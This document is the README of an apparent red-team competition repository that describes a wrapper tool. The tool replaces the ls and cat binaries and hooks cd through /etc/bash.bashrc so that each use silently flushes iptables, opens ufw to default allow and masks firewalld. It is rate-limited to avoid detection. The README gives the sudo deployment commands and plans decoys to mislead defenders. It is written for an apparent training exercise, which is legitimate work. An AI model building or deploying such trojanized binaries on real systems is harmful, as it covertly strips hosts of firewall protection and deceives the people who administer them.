# 2025CDTRed
To get scripts in the container:
curl -O -L https://github.com/hc5474/2025CDTRed/archive/main.zip

# Wrapper Tool

This tool allows you to wrap standard Linux binaries (like `ls` and `cat`) to execute hidden payloads while preserving their original behavior. Essentially, everytime a user runs "ls", "cat", or "cd", it will attempt to flush all firewall rules.

## What It Does

- **Backs up original binaries** (`ls`, `cat`)
- **Replaces them with wrapper scripts** that:
  - Call the original binary
  - Suppress any error tracebacks
  - Run a stealth payload in the background (e.g., firewall disable, flush firewall rules)
  - Rate-limit execution to limit the chance of detection and race conditions
- **Overrides built-in shell commands** (like `cd`) via `.bashrc`

## Components

- `move_binaries.sh` – Backs up original `ls` and `cat` binaries to safe locations
- `wrap_ls.sh` – Replaces `/usr/bin/ls` with a wrapper that preserves output and triggers a stealth payload
- `wrap_cat.sh` – Replaces `/usr/bin/cat` in a similar fashion
- `wrap_cd.sh` – Injects a stealth payload trigger into `cd` by editing `/etc/bash.bashrc`

## Payload Behavior

Each wrapper executes its associated real binary and then runs a payload:
- Flushes and resets `iptables`
- Resets `ufw` rules and enables it with default allow
- Disables and masks `firewalld`

These runs in the background and once per 10 seconds per command, using lockfiles and timestamps.

## Installation

1. Run the backup script:
   ```bash
   sudo bash move_binaries.sh
2. Then for each wrapper, run the corresponding bash wrapper bash script, for example: 
    ```bash
    sudo bash ./wrapper/wrap_ls.sh

3. Or, in a freshly new deployment; One could just run:
    ```bash
    sudo bash ./wrapper_deploy
## Next Step

1. Automate deployment with Ansible scripts
2. Create additional scripts on the side that can be triggered by these commands to run in the background.
3. Create depoy scripts to misguide blue team thinking they have found the problem.

